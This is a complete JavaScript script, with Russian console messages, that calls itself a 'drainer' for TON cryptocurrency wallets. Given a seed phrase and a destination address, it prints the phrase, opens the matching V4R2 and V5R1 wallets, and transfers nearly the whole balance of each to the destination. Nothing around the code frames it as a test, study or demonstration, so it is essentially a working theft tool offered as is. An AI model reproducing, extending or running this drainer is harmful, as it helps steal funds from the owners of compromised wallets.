import { mnemonicToWalletKey } from '@ton/crypto';
import pkg from '@ton/ton';
const { TonClient, WalletContractV5R1, internal, Address, WalletContractV4 } = pkg;
import { getHttpEndpoint } from '@orbs-network/ton-access';


async function main() {
    console.log("Запуск дреинера...");

    const args = process.argv.slice(2);
    if (args.length !== 2) {
        console.error("Использование: node your_script_name.js <mnemonic> <toAddress>");
        process.exit(1);
    }
    
    const mnemonics = args[0];
    console.log("Сид-фраза:", mnemonics);
    const toAddress = args[1];
    console.log("Адрес получателя:", toAddress);
    
    // V4R2
    {
        const endpoint = await getHttpEndpoint();
        const client = new TonClient({
            endpoint
        });
        const key = await mnemonicToWalletKey(mnemonics.split(' '));
        const wallet = WalletContractV4.create({
            workchain: 0,
            publicKey: key.publicKey
        });
        const walletContract = client.open(wallet);
        const walletAddress = wallet.address;
        
        console.log("Адрес кошелька v4r2:", walletAddress.toString());
        const balance = await walletContract.getBalance();
        console.log("Баланс TON:", ((balance).toString()));
        

        if (balance > 100_000_000) {
            const seqno = await walletContract.getSeqno();
            console.log("Создание транзакции");
            console.log("Адрес получателя:", toAddress);

            console.log(await client.isContractDeployed(Address.parse(toAddress)));

            // Отправка токенов (в nanotons: 1 TON = 1_000_000_000 nanotons)
            await walletContract.sendTransfer({
                secretKey: key.secretKey,
                seqno,
                messages: [
                    internal({
                        to: toAddress,
                        value: BigInt(balance) - BigInt(10_000_000)
                    })
                ]
            });
            console.log("Транзакция отправлена");
        }
    }
    // V5R1
    {
        const endpoint = await getHttpEndpoint();
        const client = new TonClient({
            endpoint
        });
        const key = await mnemonicToWalletKey(mnemonics.split(' '));
        const wallet = WalletContractV5R1.create({
            workchain: 0,
            publicKey: key.publicKey
        });
        const walletContract = client.open(wallet);
        const walletAddress = wallet.address;
        
        console.log("Адрес кошелька v5r1:", walletAddress.toString());
        const balance = await walletContract.getBalance();
        console.log("Баланс TON:", ((balance).toString()));
        

        if (balance > 100_000_000) {
            const seqno = await walletContract.getSeqno();
            console.log("Создание транзакции");
            console.log("Адрес получателя:", toAddress);

            console.log(await client.isContractDeployed(Address.parse(toAddress)));

            // Отправка токенов (в nanotons: 1 TON = 1_000_000_000 nanotons)
            await walletContract.sendTransfer({
                secretKey: key.secretKey,
                seqno,
                messages: [
                    internal({
                        to: toAddress,
                        value: BigInt(balance) - BigInt(10_000_000)
                    })
                ]
            });
            console.log("Транзакция отправлена");
        }
    }
    console.log("Дреинер завершил работу...");
}

main().catch(console.error);
